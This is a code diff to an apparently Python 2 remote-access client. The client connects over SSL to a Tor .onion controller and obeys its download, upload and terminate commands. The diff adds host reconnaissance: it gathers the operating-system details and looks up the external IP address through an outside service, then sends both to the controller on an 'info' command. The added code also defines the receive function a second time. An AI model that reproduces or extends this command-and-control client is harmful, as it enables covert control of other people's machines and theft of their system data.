@@ -1,9 +1,20 @@
-import socket, ssl, pprint, socks, os, sys, hashlib, hmac
+import socket, ssl, pprint, socks, os, sys, hashlib, hmac, platform, urllib2
 from colored import fg, bg, attr
 from subprocess import Popen, PIPE, STDOUT
 
 host = '3pnzzdpq7aj6s6b6.onion'
 cType = "client000-crypto"
+
+# sysinfo
+uname = platform.uname()[0:3]
+
+try:
+    myIP = urllib2.urlopen("http://myexternalip.com/raw").read()[0:-1]
+except:
+    myIP = "Error! Can't check IP!"
+def RecvData():
+    temp = ssl_sock.read()
+    return temp
 
 def RecvData():
     temp = ssl_sock.read()
@@ -74,6 +85,10 @@ while 1:
     if inText.startswith("download"):
         UploadFILE(inText.split(" ")[1])
         chunk = RecvData()
+    elif inText == "info":
+        SendData(str(uname))
+        SendData('ip:'+myIP)
+        SendData("end-info")
     elif inText.startswith("upload"):
         DownloadFILE(inText.split(" ")[1])
     elif inText == "terminate":
@@ -85,15 +100,3 @@ while 1:
     else:
         print '[inText] ' + inText
         ssl_sock.write(inText)
-
-#if False: # from the Python 2.7.3 docs
-    # Set a simple HTTP request -- use httplib in actual code.
-#    ssl_sock.write("""GET / HTTP/1.0\r
-#    Host: www.verisign.com\n\n""")
-
-    # Read a chunk of data.  Will not necessarily
-    # read all the data returned by the server.
-#    data = ssl_sock.read()
-
-    # note that closing the SSLSocket will also close the underlying socket
-#    ssl_sock.close()
